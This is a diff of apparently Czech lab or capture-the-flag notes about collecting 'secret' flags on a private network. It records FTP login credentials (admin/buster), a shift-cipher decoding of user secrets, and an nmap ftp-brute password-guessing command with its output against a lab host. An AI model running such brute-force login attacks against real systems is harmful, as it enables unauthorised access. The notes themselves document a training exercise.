@@ -38,3 +38,36 @@ Tajemstvi_H_6e6d348321ba3ef333b8a8ae5826060cc860496cb13c6b017b234006012ff0e8
 je tam repo "secret". V repu je main.c
 Git show main.c vypise metadata a zmeny. Ve zmenach je tajemstvi F
 Tajemstvi_F_c727260c0332918f7a1c340f8ee9ad414b71d0b8efffe9178815fd7399b00125
+
+
+5 - ftp 192.168.122.164
+
+admin
+buster
+posunuti o 10 doprava
+
+
+student:
+Dktowcdfs_N_5ol46k43kn3225m90k85nmn11mo3nn491k9l4664mk489274pm301k70ok7o398l
+Tajemstvi_D_5eb46a43ad3225c90a85dcd11ce3dd491a9b4664ca489274fc301a70ea7e398b
+
+root:
+Dktowcdfs_N_00p3mlo551lkl1pm393866m48752kmp98l4443kok24o229921m84128po367m16
+Tajemstvi_D_00f3cbe551bab1fc393866c48752acf98b4443aea24e229921c84128fe367c16
+
+
+zkusil jsem rucne prochazet uzivatele - nasel jsem admin
+nmap --script ftp-brute -p21 192.168.122.164 --script-args userdb=userftp.txt-bash-4.2$ nmap --script ftp-brute -p21 192.168.122.164 --script-args userdb=userftp.txt
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2023-11-23 07:46 UTC
+Nmap scan report for 192.168.122.164
+Host is up (0.00036s latency).
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-brute: 
+|   Accounts
+|     admin:buster - Valid credentials
+|   Statistics
+|_    Performed 145 guesses in 46 seconds, average tps: 3
+
+Nmap done: 1 IP address (1 host up) scanned in 46.40 seconds
